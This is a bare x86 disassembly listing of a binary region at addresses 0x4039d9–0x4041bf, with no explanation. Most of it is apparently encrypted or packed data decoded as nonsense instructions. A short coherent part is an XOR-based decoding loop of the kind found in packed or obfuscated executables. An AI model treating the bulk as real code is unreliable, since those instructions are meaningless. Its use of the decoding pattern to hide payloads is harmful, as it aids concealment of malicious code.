  4039d9:	call   0xe4c19f05
  4039de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039df:	lea    ecx,[ecx]
  4039e1:	sub    ebp,0x17124cb2
  4039e7:	ficom  WORD PTR [eax-0xff00f79]
  4039ed:	xor    al,al
  4039ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039f0:	int3   
  4039f1:	ret    
  4039f2:	adc    al,0x89
  4039f4:	mov    bl,0x8
  4039f6:	test   ebp,0xcb9982aa
  4039fc:	or     cl,BYTE PTR [edx]
  4039fe:	int    0x74
  403a00:	mov    dh,0x5f
  403a02:	inc    edx
  403a03:	sbb    DWORD PTR [edi-0x65],esi
  403a06:	xchg   esi,eax
  403a07:	xor    eax,0x61e2b7d8
  403a0c:	dec    edx
  403a0d:	mov    ecx,0x52f8b97f
  403a12:	mov    ebx,0xa66181f9
  403a17:	frstor [ebx]
  403a19:	mov    ch,0x8b
  403a1b:	das    
  403a1c:	shl    DWORD PTR [eax+0x24a7edd3],cl
  403a22:	adc    bl,bh
  403a24:	and    esi,DWORD PTR [edi]
  403a26:	das    
  403a27:	jo     0x403a58
  403a29:	push   0xffffffa9
  403a2b:	ret    
  403a2c:	mov    ch,0x32
  403a2e:	inc    esi
  403a2f:	mov    bl,0x4f
  403a31:	sbb    cl,0xc8
  403a34:	stos   DWORD PTR es:[edi],eax
  403a35:	daa    
  403a36:	and    eax,0x62ebe720
  403a3b:	adc    BYTE PTR [edx-0x64672000],0x36
  403a42:	or     DWORD PTR [edi-0x3b],edx
  403a45:	retf   0x8dd7
  403a48:	sub    edx,DWORD PTR [ebp-0x6a9bb58c]
  403a4e:	jge    0x403ac9
  403a50:	adc    BYTE PTR gs:[edi+0x7c7b28a0],ch
  403a57:	lock lods al,BYTE PTR ds:[esi]
  403a59:	mov    eax,0xf96f219d
  403a5e:	fisttp DWORD PTR [edi]
  403a60:	jno    0x403a13
  403a62:	xor    DWORD PTR [eax],edi
  403a64:	int3   
  403a65:	push   es
  403a66:	pop    eax
  403a67:	stc    
  403a68:	jne    0x4039f4
  403a6a:	sub    al,0x10
  403a6c:	add    al,0x1a
  403a6e:	vmread DWORD PTR [eax+0x25],eax
  403a72:	fs mov al,0xc2
  403a75:	adc    DWORD PTR [ecx],0xfffffffc
  403a78:	pop    esp
  403a79:	and    cl,BYTE PTR [edi]
  403a7b:	addr16 gs fucomi st,st(6)
  403a7f:	in     al,0x2a
  403a81:	push   esi
  403a82:	pop    ecx
  403a83:	cli    
  403a84:	cmp    BYTE PTR [edx],0x6d
  403a87:	cmc    
  403a88:	mov    ah,0xfc
  403a8a:	and    al,0x2
  403a8c:	fidivr DWORD PTR [edi]
  403a8e:	lods   eax,DWORD PTR ds:[esi]
  403a8f:	stos   BYTE PTR es:[edi],al
  403a90:	dec    edx
  403a91:	cmp    al,0x28
  403a93:	xchg   BYTE PTR [ebx],al
  403a95:	jl     0x403a65
  403a97:	and    edx,DWORD PTR [edi+0x32df4741]
  403a9d:	sbb    al,0xac
  403a9f:	pop    esp
  403aa0:	mov    ecx,0xd49719f
  403aa5:	ret    
  403aa6:	and    BYTE PTR [ecx-0xe],bl
  403aa9:	mov    WORD PTR [esi],ss
  403aab:	cli    
  403aac:	out    dx,eax
  403aad:	into   
  403aae:	arpl   di,bp
  403ab0:	mov    al,ds:0x7c1b84b
  403ab5:	xlat   BYTE PTR ds:[ebx]
  403ab6:	ins    DWORD PTR es:[edi],dx
  403ab7:	test   BYTE PTR [eax-0x5f9d1e3a],0xc0
  403abe:	sti    
  403abf:	push   ss
  403ac0:	sub    ch,0xa9
  403ac3:	inc    ecx
  403ac4:	cld    
  403ac5:	pushf  
  403ac6:	xchg   BYTE PTR [edx+0x2bfcd6fb],dl
  403acc:	mov    bh,0x71
  403ace:	xchg   esp,eax
  403acf:	repnz aaa 
  403ad1:	push   ebp
  403ad2:	dec    ebp
  403ad3:	pop    ecx
  403ad4:	or     cl,al
  403ad6:	stc    
  403ad7:	dec    ebx
  403ad8:	add    dl,dh
  403ada:	add    ch,BYTE PTR [edi-0x6d]
  403add:	cmp    al,0x67
  403adf:	aam    0xdf
  403ae1:	cs mov al,0x7
  403ae4:	jg     0x403b2b
  403ae6:	int3   
  403ae7:	or     ch,BYTE PTR [ebx+ebx*1]
  403aea:	xchg   esi,eax
  403aeb:	fmul   QWORD PTR [esi+0x66]
  403aee:	aaa    
  403aef:	ret    
  403af0:	popa   
  403af1:	mov    al,0x3b
  403af3:	sub    DWORD PTR [ecx+0x65],edi
  403af6:	(bad)  
  403af7:	sbb    cl,cl
  403af9:	in     al,0x38
  403afb:	xor    dh,BYTE PTR [ebx]
  403afd:	retf   0x8ad1
  403b00:	out    dx,eax
  403b01:	xor    eax,0xeb8fb346
  403b06:	fimul  WORD PTR [ecx+esi*1-0x1a675eda]
  403b0d:	mov    cl,0xb1
  403b0f:	push   ecx
  403b10:	outs   dx,DWORD PTR ds:[esi]
  403b11:	cld    
  403b12:	repnz lahf 
  403b14:	ins    BYTE PTR es:[edi],dx
  403b15:	mov    dl,0x62
  403b17:	lahf   
  403b18:	nop
  403b19:	fimul  WORD PTR [ebx-0x5a]
  403b1c:	xchg   ebp,eax
  403b1d:	cld    
  403b1e:	xchg   BYTE PTR [ecx],ah
  403b20:	push   ds
  403b21:	sub    edx,edx
  403b23:	fs call 0xbb058486
  403b29:	in     al,dx
  403b2a:	jp     0x403b35
  403b2c:	pop    es
  403b2d:	sub    BYTE PTR [edi],bh
  403b2f:	jae    0x403ab5
  403b31:	retf   0x7ff1
  403b34:	dec    ebx
  403b35:	mov    ds:0x2020dc51,al
  403b3a:	pop    ebp
  403b3b:	inc    ebp
  403b3c:	mov    ds:0x6f616006,eax
  403b42:	dec    ecx
  403b43:	inc    eax
  403b44:	pop    DWORD PTR [eax-0x3c19cfe2]
  403b4a:	fcomip st,st(6)
  403b4c:	mov    cl,BYTE PTR [ecx]
  403b4e:	pop    edi
  403b4f:	clc    
  403b50:	mov    al,ds:0x5ec88211
  403b55:	int3   
  403b56:	add    dh,BYTE PTR [ecx]
  403b58:	stc    
  403b59:	fnsave [edx-0x2e3b20f0]
  403b5f:	aaa    
  403b60:	aam    0x23
  403b62:	cmp    DWORD PTR [esi+edi*4-0x40],esp
  403b66:	jno    0x403b29
  403b68:	jo     0x403b18
  403b6a:	mov    cl,0xf7
  403b6c:	sbb    eax,0xba08a94f
  403b71:	xor    BYTE PTR [eax+0x2a],bl
  403b74:	cmc    
  403b75:	and    ecx,ebp
  403b77:	out    dx,eax
  403b78:	in     eax,0xb9
  403b7a:	and    al,0x8b
  403b7c:	mov    edi,0x3874ef21
  403b81:	pushf  
  403b82:	pop    edx
  403b83:	add    eax,0x90e0a3a3
  403b88:	jmp    0x403b8e
  403b8a:	jb     0x403b7c
  403b8c:	adc    ecx,DWORD PTR [edx-0x3bf79440]
  403b92:	cmp    eax,0xc416d81f
  403b97:	inc    ebp
  403b98:	inc    eax
  403b99:	sub    cl,BYTE PTR [edx]
  403b9b:	(bad)  
  403b9c:	adc    dh,al
  403b9e:	pop    ds
  403b9f:	mov    ss:0x482ff48c,al
  403ba5:	in     eax,dx
  403ba6:	push   ds
  403ba7:	and    ebp,edx
  403ba9:	or     eax,0x221556fa
  403bae:	ret    
  403baf:	jns    0x403b48
  403bb1:	sub    bh,BYTE PTR [eax]
  403bb3:	ds add eax,0x56cbe247
  403bb9:	je     0x403b51
  403bbb:	out    dx,al
  403bbc:	push   ebp
  403bbd:	nop
  403bbe:	jecxz  0x403bc9
  403bc0:	sub    BYTE PTR [edx+ebp*8-0x5a],dh
  403bc4:	call   0x1f1e:0x32829cc5
  403bcb:	sahf   
  403bcc:	in     eax,0x2
  403bce:	pusha  
  403bcf:	call   0xb56e:0x7f789dd0
  403bd6:	add    esi,DWORD PTR [edx+0x13]
  403bd9:	xchg   edx,edx
  403bdb:	mov    bl,0x52
  403bdd:	add    BYTE PTR [ebp+0x56],al
  403be0:	rol    dh,1
  403be2:	push   eax
  403be3:	mov    al,0x68
  403be5:	stos   BYTE PTR es:[edi],al
  403be6:	cmp    eax,edx
  403be8:	test   al,0x20
  403bea:	sbb    eax,0xc8342fa
  403bef:	or     DWORD PTR [esi+0x25],ebx
  403bf2:	sti    
  403bf3:	leave  
  403bf4:	jl     0x403bed
  403bf6:	jge    0x403b7c
  403bf8:	out    0x6b,al
  403bfa:	push   edx
  403bfb:	test   BYTE PTR [eax],dl
  403bfd:	adc    eax,eax
  403bff:	shl    DWORD PTR [edi+0x5ec5ddfb],1
  403c05:	pop    edx
  403c06:	mov    dh,0xa9
  403c08:	ss cld 
  403c0a:	repnz cmp bl,bl
  403c0d:	xor    al,0xa5
  403c0f:	cli    
  403c10:	sbb    al,0x5c
  403c12:	ds pop eax
  403c14:	push   edi
  403c15:	xchg   edi,eax
  403c16:	daa    
  403c17:	xchg   edi,eax
  403c18:	pop    ss
  403c19:	outs   dx,DWORD PTR ds:[esi]
  403c1a:	mov    edx,0x5c1eb5f3
  403c1f:	dec    ebx
  403c20:	enter  0xcb88,0xe1
  403c24:	xor    eax,DWORD PTR [ebp+0x7e]
  403c27:	dec    esi
  403c28:	adc    BYTE PTR [edx+0x4adea6f9],al
  403c2e:	std    
  403c2f:	imul   ecx,DWORD PTR [edx+0x794aa9bf],0xd57a945d
  403c39:	adc    BYTE PTR ds:0x77e553f,dl
  403c3f:	xor    DWORD PTR [ecx+0x71fd5b09],eax
  403c45:	xor    al,0xf3
  403c47:	mov    bh,cl
  403c49:	mov    dl,0x86
  403c4b:	test   al,0x38
  403c4d:	push   edi
  403c4e:	out    dx,al
  403c4f:	loop   0x403c02
  403c51:	cmp    BYTE PTR [eax-0x48],ch
  403c54:	cdq    
  403c55:	js     0x403c3d
  403c57:	dec    eax
  403c58:	(bad)  
  403c59:	jmp    0x403c07
  403c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c5c:	dec    ebx
  403c5d:	mov    ebx,0xdc73c25a
  403c62:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c64:	jno    0x403cba
  403c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c67:	fimul  WORD PTR [ecx+0x75]
  403c6a:	cmp    bh,BYTE PTR [esi-0x32]
  403c6d:	xchg   ebx,eax
  403c6e:	fbld   TBYTE PTR [edx+0x53]
  403c71:	pop    es
  403c72:	test   eax,0xe3107a86
  403c77:	bound  ebp,QWORD PTR [eax+0x52d690ee]
  403c7d:	nop
  403c7e:	cmp    DWORD PTR [eax+0x78],0x97723c42
  403c85:	dec    ebp
  403c86:	pop    ds
  403c87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c88:	gs sub ecx,esp
  403c8b:	add    al,0xb9
  403c8d:	loop   0x403c51
  403c8f:	or     DWORD PTR [ebp+0x12224799],esp
  403c95:	cwde   
  403c96:	mov    ds:0x1395d603,eax
  403c9b:	sub    ebx,DWORD PTR [esi]
  403c9d:	out    dx,eax
  403c9e:	xchg   BYTE PTR [edi],cl
  403ca0:	push   edx
  403ca1:	add    ax,di
  403ca4:	movzx  eax,ax
  403ca7:	mov    DWORD PTR [ebp-0x14],eax
  403caa:	mov    eax,DWORD PTR [ebp+0x8]
  403cad:	movzx  eax,WORD PTR [eax+edx*4]
  403cb1:	xor    eax,0x8a38
  403cb6:	add    eax,edi
  403cb8:	mov    edi,DWORD PTR [ebp-0x14]
  403cbb:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403cbf:	mov    eax,DWORD PTR [ebp-0xc]
  403cc2:	inc    edx
  403cc3:	cmp    edx,eax
  403cc5:	jne    0x40389a
  403ccb:	pop    edi
  403ccc:	pop    ebx
  403ccd:	mov    eax,DWORD PTR [ebp-0x8]
  403cd0:	mov    edx,DWORD PTR [ebp+0x10]
  403cd3:	xor    eax,ecx
  403cd5:	add    eax,esi
  403cd7:	mov    DWORD PTR [edx],eax
  403cd9:	jmp    0x4040ce
  403cde:	mov    ch,0xd5
  403ce0:	or     dh,al
  403ce2:	push   0xfffffff1
  403ce4:	jge    0x403d43
  403ce6:	inc    eax
  403ce7:	xchg   ecx,eax
  403ce8:	add    esp,0x4923213e
  403cee:	mov    ebx,0x567e7e1f
  403cf3:	jns    0x403d73
  403cf5:	jle    0x403d6a
  403cf7:	sub    al,0x3
  403cf9:	fstp   DWORD PTR [ecx+ecx*1-0x50]
  403cfd:	mov    cl,0xe3
  403cff:	pop    ds
  403d00:	cli    
  403d01:	push   ecx
  403d02:	mov    edi,0x1cd490f3
  403d07:	inc    ebx
  403d08:	stos   DWORD PTR es:[edi],eax
  403d09:	jne    0x403d12
  403d0b:	mov    al,0x4b
  403d0d:	ds dec ebp
  403d0f:	jmp    0xe445ced2
  403d14:	test   ah,cl
  403d16:	mov    ah,0x47
  403d18:	adc    edi,0x9ebc8067
  403d1e:	pop    ss
  403d1f:	sub    al,0xf2
  403d21:	daa    
  403d22:	mov    eax,0xd61b6859
  403d27:	jmp    0x403d56
  403d29:	(bad)  [ecx]
  403d2b:	mov    WORD PTR [edx+eax*4+0x5d001bfc],cs
  403d32:	adc    BYTE PTR [edi],dh
  403d34:	loop   0x403cd1
  403d36:	jmp    FWORD PTR [eax-0x3e]
  403d39:	sbb    edi,ebp
  403d3b:	jge    0x403d83
  403d3d:	jmp    0x403d5c
  403d3f:	adc    DWORD PTR [ecx-0x6f52fe1a],0x43
  403d46:	iret   
  403d47:	test   ecx,ebp
  403d49:	int    0xd9
  403d4b:	sbb    BYTE PTR [eax],cl
  403d4d:	icebp  
  403d4e:	jp     0x403cdd
  403d50:	push   cs
  403d51:	and    esp,DWORD PTR [ebp+0x3f]
  403d54:	jbe    0x403d44
  403d56:	shl    BYTE PTR [edi+ecx*2],0xb0
  403d5a:	mov    DWORD PTR [ecx-0x27],0xacd32b7e
  403d61:	nop
  403d62:	pop    es
  403d63:	jae    0x403cf1
  403d65:	dec    ebp
  403d66:	outs   dx,BYTE PTR ds:[esi]
  403d67:	iret   
  403d68:	add    eax,0x13240f79
  403d6d:	fst    QWORD PTR ds:0x84d23703
  403d73:	loope  0x403dcb
  403d75:	loope  0x403d41
  403d77:	mov    bl,0xbd
  403d79:	repz push esp
  403d7b:	mov    edx,0x7ce373ce
  403d80:	mov    ds:0x4f472e77,eax
  403d85:	out    dx,eax
  403d86:	fcmove st,st(6)
  403d88:	ficomp WORD PTR [ebx+0x7e]
  403d8b:	mov    al,ds:0x370026c7
  403d90:	in     al,dx
  403d91:	jb     0x403d54
  403d93:	or     eax,0xbc8a1834
  403d98:	les    edx,FWORD PTR [eax+0x74d6ecef]
  403d9e:	xlat   BYTE PTR fs:[ebx]
  403da0:	pop    ds
  403da1:	fst    QWORD PTR [ebp+0x6e]
  403da4:	xchg   DWORD PTR [edx-0x6a9f981a],ebx
  403daa:	xchg   edi,eax
  403dab:	mov    esi,0x6c25af71
  403db0:	add    BYTE PTR [edx-0x5a],dh
  403db3:	push   edx
  403db4:	sub    bl,BYTE PTR [ebp-0x676a7cf7]
  403dba:	out    dx,al
  403dbb:	pop    esp
  403dbc:	icebp  
  403dbd:	pop    ss
  403dbe:	add    al,0xeb
  403dc0:	or     DWORD PTR [ecx+0x384eac55],esp
  403dc6:	cmc    
  403dc7:	in     al,dx
  403dc8:	inc    ecx
  403dc9:	sbb    ecx,DWORD PTR [edx+0x6757a6f]
  403dcf:	push   esi
  403dd0:	retf   0xbc0d
  403dd3:	test   eax,0x3a17459c
  403dd8:	and    esi,eax
  403dda:	imul   ebx,DWORD PTR [edi+0x6a5a6f8d],0x8951af48
  403de4:	mul    dh
  403de6:	inc    ecx
  403de7:	or     BYTE PTR [edx+0x328ffa8],bl
  403ded:	pop    ecx
  403dee:	fld    TBYTE PTR [ebp-0x51]
  403df1:	stc    
  403df2:	jne    0x403ddb
  403df4:	inc    ecx
  403df5:	sub    BYTE PTR [ebx-0x8534d7f],bl
  403dfb:	retf   
  403dfc:	pop    edi
  403dfd:	jmp    0x4eee:0x6c092bb2
  403e04:	and    eax,0xab7572ef
  403e09:	das    
  403e0a:	xor    ah,BYTE PTR [eax-0x23]
  403e0d:	mov    esi,DWORD PTR [ecx+0x5f7caaab]
  403e13:	inc    ebx
  403e14:	leave  
  403e15:	retf   
  403e16:	(bad)  
  403e17:	mov    esp,0x37b530bb
  403e1c:	jo     0x403e9a
  403e1e:	loope  0x403e11
  403e20:	dec    ecx
  403e21:	jno    0x403dcf
  403e23:	pop    edx
  403e24:	out    dx,eax
  403e25:	in     al,0x84
  403e27:	out    0x58,al
  403e29:	push   esi
  403e2a:	add    ebp,DWORD PTR [esi]
  403e2c:	fucomi st,st(7)
  403e2e:	and    BYTE PTR [ebx],ch
  403e30:	adc    eax,0xdde2c4f9
  403e35:	push   ebp
  403e36:	sub    ah,al
  403e38:	sbb    DWORD PTR [edi-0x12],0x1a61fbe1
  403e3f:	xchg   esi,eax
  403e40:	enter  0xd3e8,0x43
  403e44:	pop    esi
  403e45:	shl    DWORD PTR [eax-0x2cda23b1],cl
  403e4b:	pop    es
  403e4c:	sti    
  403e4d:	icebp  
  403e4e:	jmp    0x403de6
  403e50:	mov    bh,0x79
  403e52:	std    
  403e53:	sub    eax,0xbde6a3c
  403e58:	jb     0x403e0c
  403e5a:	out    dx,al
  403e5b:	popa   
  403e5c:	repz adc esp,DWORD PTR [edx-0x7d]
  403e60:	fiadd  WORD PTR [ecx]
  403e62:	add    eax,0x6c0b2e91
  403e67:	pop    ebp
  403e68:	xor    BYTE PTR [edi+ecx*2],dl
  403e6b:	or     eax,0x15055c78
  403e70:	fld    TBYTE PTR [eax-0x39]
  403e73:	(bad)  
  403e74:	js     0x403e7e
  403e76:	leave  
  403e77:	or     eax,0xeaafde35
  403e7c:	xor    eax,0x45907269
  403e81:	retf   
  403e82:	std    
  403e83:	dec    ecx
  403e84:	pop    ss
  403e85:	sbb    eax,0x71778043
  403e8a:	or     BYTE PTR [ebp-0x6d8754cd],bh
  403e90:	sbb    al,0xb0
  403e92:	mov    gs,WORD PTR [edx]
  403e94:	lods   eax,DWORD PTR ds:[esi]
  403e95:	sbb    DWORD PTR [ebp-0x7bd9be2b],ebx
  403e9b:	push   esi
  403e9c:	enter  0xec01,0xcf
  403ea0:	xchg   ecx,eax
  403ea1:	pop    ss
  403ea2:	aad    0x2f
  403ea4:	jp     0x403e53
  403ea6:	adc    DWORD PTR [ebx+ebx*4],ebp
  403ea9:	add    edi,DWORD PTR [esi-0x3a6c2053]
  403eaf:	mov    ecx,0xc9174950
  403eb4:	mov    edi,0xc10a2996
  403eb9:	idiv   BYTE PTR [edx+0x56e8087b]
  403ebf:	pop    edx
  403ec0:	mov    ds:0x691844a8,eax
  403ec5:	mov    cl,0x60
  403ec7:	inc    edi
  403ec8:	mov    ecx,0x7fc65bf7
  403ecd:	ins    DWORD PTR es:[edi],dx
  403ece:	rol    DWORD PTR [edi-0x12fa761c],0x27
  403ed5:	ja     0x403ea8
  403ed7:	xlat   BYTE PTR ds:[ebx]
  403ed8:	add    ebx,DWORD PTR [edi+0x64437e9d]
  403ede:	jl     0x403f0e
  403ee0:	mov    cl,0xca
  403ee2:	loop   0x403ea2
  403ee4:	call   0xe35f:0xd8d2610e
  403eeb:	mov    esp,0x1cf881d6
  403ef0:	repnz sub al,bh
  403ef3:	mov    BYTE PTR [ebx],dl
  403ef5:	iret   
  403ef6:	jns    0x403ed6
  403ef8:	xor    edi,DWORD PTR [ecx]
  403efa:	shl    DWORD PTR [edi+esi*2+0x2b71e769],0x45
  403f02:	int3   
  403f03:	ins    DWORD PTR es:[edi],dx
  403f04:	pop    es
  403f05:	(bad)  
  403f06:	shl    BYTE PTR [edx+0x13e6ab6],1
  403f0c:	adc    eax,0x76c6753d
  403f11:	dec    esi
  403f12:	jmp    0x403f07
  403f14:	xchg   ebp,eax
  403f15:	sub    edi,DWORD PTR [ebp-0x6ed13492]
  403f1b:	cs aaa 
  403f1d:	mov    edx,0xa784ec7d
  403f22:	and    al,0xa0
  403f24:	mov    ebp,0x1c9cbc28
  403f29:	pop    ss
  403f2a:	xor    edi,edx
  403f2c:	sub    eax,0x3d994524
  403f31:	mul    DWORD PTR [ebx]
  403f33:	cdq    
  403f34:	add    DWORD PTR [ebp-0x17],esp
  403f37:	or     DWORD PTR [ebp+0x39],0x29
  403f3b:	mov    dl,0x2
  403f3d:	pop    esp
  403f3e:	imul   ebp,DWORD PTR [edx],0xffffffbe
  403f41:	push   cs
  403f42:	push   0x9e5534c3
  403f47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f48:	mov    WORD PTR [ebp+0x51f0a4e6],es
  403f4e:	jmp    0xc7c79a4e
  403f53:	jle    0x403f35
  403f55:	jo     0x403fa5
  403f57:	xchg   ch,dl
  403f59:	mov    cs,ecx
  403f5b:	adc    BYTE PTR [ecx-0x6e80591d],ch
  403f61:	cwde   
  403f62:	dec    bh
  403f64:	test   al,0x4d
  403f66:	and    ebx,eax
  403f68:	sar    edi,cl
  403f6a:	push   0xfa368956
  403f6f:	outs   dx,DWORD PTR ds:[esi]
  403f70:	outs   dx,DWORD PTR ds:[esi]
  403f71:	cmp    ch,bh
  403f73:	rcl    esp,0xec
  403f76:	fnstsw WORD PTR ds:0xadc40e08
  403f7c:	jle    0x403f50
  403f7e:	stc    
  403f7f:	jg     0x403f02
  403f81:	and    eax,0xb304eefe
  403f86:	repnz mov ch,0x4b
  403f89:	and    esi,DWORD PTR [esi+0x498dba4]
  403f8f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  403f91:	je     0x403f80
  403f93:	cwde   
  403f94:	dec    ecx
  403f95:	fcomi  st,st(5)
  403f97:	and    dl,dl
  403f99:	mov    eax,0x96bb0ff8
  403f9e:	loop   0x404002
  403fa0:	in     eax,0x7a
  403fa2:	clc    
  403fa3:	sub    BYTE PTR [ecx-0x29c451f8],0xb
  403faa:	les    esp,FWORD PTR [ebx-0x78889d5f]
  403fb0:	arpl   WORD PTR [edx+0x11],cx
  403fb3:	in     al,dx
  403fb4:	sub    edi,edi
  403fb6:	test   DWORD PTR [edx],ecx
  403fb8:	jne    0x403fcf
  403fba:	cmp    al,0xf1
  403fbc:	jne    0x403f4e
  403fbe:	mov    ah,0x14
  403fc0:	js     0x403f67
  403fc2:	adc    dh,cl
  403fc4:	(bad)  
  403fc5:	shr    DWORD PTR [ecx+0x8472416],cl
  403fcb:	mov    bl,0xb7
  403fcd:	loop   0x403f7a
  403fcf:	int    0xff
  403fd1:	pop    edi
  403fd2:	xchg   BYTE PTR [ecx+0x16498514],bh
  403fd8:	sbb    eax,0xa83d05fb
  403fdd:	fs scas al,BYTE PTR es:[edi]
  403fdf:	das    
  403fe0:	inc    edi
  403fe1:	add    edi,DWORD PTR [ebp-0x28106661]
  403fe7:	mov    DWORD PTR [esi],0x2642c962
  403fed:	(bad)  
  403fef:	loope  0x404061
  403ff1:	or     eax,0x8bda1fdf
  403ff6:	pop    es
  403ff7:	mov    ebx,0xaf97e4f6
  403ffc:	xlat   BYTE PTR ds:[ebx]
  403ffd:	rol    DWORD PTR [edx-0x6a2feb51],0x1f
  404004:	sub    al,0xe8
  404006:	mov    ah,0xef
  404008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404009:	mov    bh,0xd4
  40400b:	stc    
  40400c:	out    dx,al
  40400d:	cmp    DWORD PTR ds:0x74530f48,eax
  404013:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404014:	repz shr DWORD PTR [ebx-0x2d63b0ba],1
  40401b:	or     al,0xda
  40401d:	sbb    ch,bl
  40401f:	push   esi
  404020:	sub    al,0x29
  404022:	adc    edx,DWORD PTR [eax]
  404024:	(bad)  [edi-0x28d3fd90]
  40402a:	(bad)  
  40402b:	in     al,0xcd
  40402d:	jnp    0x403faf
  40402f:	dec    edx
  404030:	jne    0x403fb7
  404032:	inc    ebp
  404033:	mov    ebp,DWORD PTR [eax-0x4f507a8b]
  404039:	loopne 0x404037
  40403b:	and    DWORD PTR [eax+0x1a],ecx
  40403e:	mov    eax,ds:0x3e8349f2
  404043:	mov    esi,0x90be71ad
  404048:	rcr    DWORD PTR [edi],0xfb
  40404b:	sub    bh,dh
  40404d:	ins    DWORD PTR es:[edi],dx
  40404e:	lahf   
  40404f:	dec    esp
  404050:	sub    DWORD PTR [esi-0x65],0x4d
  404054:	mov    ebp,es
  404056:	push   ds
  404057:	sbb    BYTE PTR [ebx+0x13],bl
  40405a:	stos   BYTE PTR es:[edi],al
  40405b:	sub    bl,BYTE PTR [ecx]
  40405d:	and    eax,0x652a3074
  404062:	inc    ebp
  404063:	push   ecx
  404064:	mov    ch,0xb7
  404066:	jl     0x403fe8
  404068:	cs fwait
  40406a:	mov    esp,0xe553d840
  40406f:	dec    ecx
  404070:	sub    dh,bl
  404072:	dec    edx
  404073:	in     al,dx
  404074:	sub    eax,0x1b47d36c
  404079:	cmp    DWORD PTR [ebp-0x2],edi
  40407c:	dec    bx
  40407e:	sahf   
  40407f:	out    0xd4,eax
  404081:	mov    edx,0x25f91f80
  404086:	fild   QWORD PTR [edi-0x3c373cf]
  40408c:	out    dx,al
  40408d:	cwde   
  40408e:	or     DWORD PTR [ebx-0x1d],edi
  404091:	pop    es
  404092:	loop   0x40408d
  404094:	arpl   WORD PTR [edx],cx
  404096:	sahf   
  404097:	sahf   
  404098:	or     DWORD PTR [ecx+0x7573378d],ebp
  40409e:	push   ebx
  40409f:	dec    edi
  4040a0:	mov    es,WORD PTR [eax+ebp*8]
  4040a3:	or     eax,0x41ba866d
  4040a8:	out    dx,al
  4040a9:	ret    0xa48
  4040ac:	cmp    esi,ebp
  4040ae:	sahf   
  4040af:	push   esp
  4040b0:	popf   
  4040b1:	(bad)  
  4040b2:	in     eax,dx
  4040b3:	pop    eax
  4040b4:	in     eax,dx
  4040b5:	mov    esp,0xd8f067a3
  4040ba:	mov    eax,0x425b4596
  4040bf:	cmp    eax,edx
  4040c1:	and    BYTE PTR [ecx],bh
  4040c3:	push   0xffffffd6
  4040c5:	mov    bh,0xdd
  4040c7:	jmp    0x4040a4
  4040c9:	and    DWORD PTR [esi-0x7410eb65],edi
  4040cf:	inc    ebp
  4040d0:	clc    
  4040d1:	xor    eax,ecx
  4040d3:	add    eax,esi
  4040d5:	mov    DWORD PTR [ebp+0x8],eax
  4040d8:	mov    eax,DWORD PTR [ebp+0x8]
  4040db:	jmp    0x4044d0
  4040e0:	pop    edx
  4040e1:	ret    0x1375
  4040e4:	jge    0x4040a3
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	jae    0x404096
  4040e9:	test   BYTE PTR [eax+0x630e13cd],ah
  4040ef:	adc    DWORD PTR [ebx+0x567e7e1b],0x5b7e7e79
  4040f9:	shl    BYTE PTR [edx+0x38c1bd02],1
  4040ff:	ret    
  404100:	push   edx
  404101:	in     eax,0x13
  404103:	and    BYTE PTR [edx+0x74acfd09],bl
  404109:	dec    edx
  40410a:	(bad)  
  40410b:	xor    BYTE PTR [edi+0x69],al
  40410e:	out    dx,al
  40410f:	jb     0x4040bc
  404111:	sahf   
  404112:	lods   al,BYTE PTR ds:[esi]
  404113:	or     BYTE PTR [edx+ebp*8+0x1d],ah
  404117:	push   cs
  404118:	push   edx
  404119:	call   FWORD PTR [edi-0x1f]
  40411c:	xchg   dl,cl
  40411e:	mov    ah,0x8a
  404120:	cwde   
  404121:	daa    
  404122:	js     0x40419b
  404124:	or     esi,DWORD PTR [ebx-0x599f6ceb]
  40412a:	push   0xf557afc7
  40412f:	pop    esi
  404130:	lock mov eax,ds:0xcab84709
  404136:	lds    esi,FWORD PTR [ebx]
  404138:	mov    esp,0x6a46cca4
  40413d:	and    al,0xd6
  40413f:	aad    0xee
  404141:	dec    ebp
  404142:	aaa    
  404143:	jnp    0x404189
  404145:	adc    esi,ecx
  404147:	jl     0x404102
  404149:	sbb    al,0xc4
  40414b:	inc    ebx
  40414c:	inc    eax
  40414d:	in     eax,dx
  40414e:	test   dl,bh
  404150:	jo     0x404193
  404152:	sbb    al,0xb9
  404154:	bound  ebx,QWORD PTR [ebp-0x2e]
  404157:	sar    ch,0xe6
  40415a:	adc    edx,ecx
  40415c:	dec    esi
  40415d:	cwde   
  40415e:	push   eax
  40415f:	dec    ebx
  404160:	test   eax,0xa2ca5b5f
  404165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404166:	xchg   ecx,eax
  404167:	mov    edx,0x92c2b6b4
  40416c:	mov    cs,WORD PTR [edx-0x56cabecc]
  404172:	idiv   DWORD PTR [ebx+0x72]
  404175:	and    edi,DWORD PTR [ebx-0x2a895eaf]
  40417b:	rcl    al,1
  40417d:	sbb    esi,esi
  40417f:	cdq    
  404180:	and    DWORD PTR [ebx+0x4fdbba93],0xffffffff
  404187:	push   fs
  404189:	mov    ?,esp
  40418b:	inc    eax
  40418c:	push   eax
  40418d:	and    al,0x22
  40418f:	aad    0x21
  404191:	push   esi
  404192:	jns    0x404187
  404194:	xchg   bp,ax
  404196:	retf   0xb204
  404199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40419a:	retf   0xee05
  40419d:	mov    BYTE PTR [edx-0x78123267],dl
  4041a3:	test   edi,esi
  4041a5:	mov    esp,0x7f645a7c
  4041aa:	cmp    DWORD PTR [ebp-0x43],edx
  4041ad:	ror    BYTE PTR fs:[ebx-0x4b3f2b6b],0xe6
  4041b5:	lock pop edx
  4041b7:	retf   0x47b
  4041ba:	scas   eax,DWORD PTR es:[edi]
  4041bb:	push   edx
  4041bc:	xor    al,0x86
  4041be:	ins    DWORD PTR es:[edi],dx
  4041bf:	std    
